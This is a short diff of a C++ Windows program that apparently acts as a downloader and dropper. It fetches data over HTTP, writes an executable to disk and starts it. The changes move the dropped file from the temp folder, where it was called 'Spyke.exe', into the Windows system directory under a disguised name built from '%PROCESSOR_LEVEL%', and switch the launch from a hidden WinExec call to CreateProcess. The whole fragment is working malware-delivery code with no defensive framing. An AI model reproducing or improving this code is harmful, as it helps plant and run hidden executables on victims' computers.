@@ -24,11 +24,19 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	conn.HTTPGet();
 
 	// writing an executable to the temporary folder
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
 
 	TCHAR path[MAX_PATH + 1];
 	DWORD len = MAX_PATH + 1;
-	GetTempPath(len, path);
-	TCHAR* full_path = _tcscat(path, L"Spyke.exe");
+	//GetTempPath(len, path);
+	//TCHAR* full_path = _tcscat(path, L"Spyke.exe");
+	GetWindowsDirectory(path, MAX_PATH);
+	TCHAR* full_path = _tcscat(path, L"\\%PROCESSOR_LEVEL%.exe");
 	wstring ws(full_path);
 	string Path = string(ws.begin(), ws.end());
 	ofstream ffo(full_path, ios::binary);
@@ -37,7 +45,11 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
 	// starting it
 
-	WinExec(Path.c_str(), SW_HIDE);
+	//WinExec((Path + " &").c_str(), SW_HIDE);
+	wchar_t wtext[MAX_PATH+1];
+	mbstowcs(wtext, Path.c_str(), strlen(Path.c_str()) + 1);//Plus null
+	LPWSTR ptr = wtext;
+	CreateProcess(0,ptr, 0, 0, 0, 0, 0, 0, &si, &pi);
 
 	return 0;
 }
